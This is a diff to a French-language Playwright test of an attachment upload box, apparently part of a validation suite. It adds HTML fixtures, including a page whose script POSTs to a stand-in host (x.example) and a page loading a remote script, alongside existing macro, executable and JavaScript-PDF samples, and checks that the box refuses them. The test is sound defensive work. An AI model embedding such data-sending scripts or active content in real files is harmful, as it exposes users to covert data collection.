@@ -36,6 +36,11 @@ f_doc = ecrire("vieux.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"0" * 100)
 f_exe = ecrire("prog.exe", b"MZ" + b"0" * 100)
 f_js = ecrire("js.pdf", T.sain_pdf().replace(b"%%EOF", b"1 0 obj << /S /JavaScript /JS (x) >> endobj\n%%EOF"))
 f_gros = ecrire("gros.pdf", b"%PDF-1.4\n" + os.urandom(16 * 1024 * 1024))
+PAGE = lambda corps: ("<!DOCTYPE html><html lang=\"fr\"><head><meta charset=\"utf-8\"><title>Outil</title></head><body>" + corps + "</body></html>").encode()
+f_html = ecrire("outil.html", PAGE("<p>Bonjour</p><script>document.title = 'x';</script>"))
+f_html_fetch = ecrire("collecte.html", PAGE("<script>fetch('https://x.example/c', {method:'POST'})</script>"))
+f_html_dist = ecrire("distant.html", PAGE("<script src=\"https://cdn.example/lib.js\"></script>"))
+f_html_faux = ecrire("faux.html", b"juste du texte")
 f_md = ecrire("SKILL.md", "---\nname: synthese\ndescription: Synthétise des notes.\n---\nSynthétise les notes fournies en 5 points.\n".encode())
 
 serveurs = [subprocess.Popen(["node", os.path.join(RACINE, "boite-de-depot", "tests", "serveur_local.js"), str(PORT_BOITE)], stdout=subprocess.DEVNULL),
@@ -62,12 +67,17 @@ try:
         for c in page.locator("input[name=controles]").all(): c.check()
 
         print("Pièces jointes : refus immédiats dans le navigateur")
-        for nom, chemin, mot in [("macro .docm", f_docm, "macros"), ("vieux .doc", f_doc, "ancien format"), (".exe", f_exe, "non accepté"), ("pdf JavaScript", f_js, "actif"), ("docx piégé", f_piege, "macros"), ("16 Mo", f_gros, "15 Mo")]:
+        for nom, chemin, mot in [("macro .docm", f_docm, "macros"), ("vieux .doc", f_doc, "ancien format"), (".exe", f_exe, "non accepté"), ("pdf JavaScript", f_js, "actif"), ("docx piégé", f_piege, "macros"), ("16 Mo", f_gros, "15 Mo"), ("html avec fetch", f_html_fetch, "fetch"), ("html avec ressource distante", f_html_dist, "distante"), ("faux html", f_html_faux, "pas une page")]:
             page.set_input_files("#fichier-pj", chemin)
             page.wait_for_function("document.querySelector('#retour-pj') && !document.querySelector('#retour-pj').hidden")
             time.sleep(0.4)
             txt = page.inner_text("#retour-pj")
             verifier("refusé : " + nom, mot.lower() in txt.lower() and page.locator("#liste-pj li").count() == 0, txt)
+        page.set_input_files("#fichier-pj", f_html)
+        page.wait_for_function("document.querySelectorAll('#liste-pj li').length >= 2")
+        verifier("page HTML autonome acceptée", page.locator("#liste-pj li").count() == 2 and "outil.html" in page.inner_text("#liste-pj"), page.inner_text("#liste-pj"))
+        page.locator("#liste-pj li .bouton.lien").first.click()
+        verifier("page HTML retirée", page.locator("#liste-pj li").count() == 0)
         page.set_input_files("#fichier-pj", [f_docx, f_pdf])
         page.wait_for_function("document.querySelectorAll('#liste-pj li').length >= 3")
         verifier("2 pièces saines acceptées + ligne de total", page.locator("#liste-pj li").count() == 3 and "2 fichiers" in page.inner_text("#liste-pj"), page.inner_text("#liste-pj"))
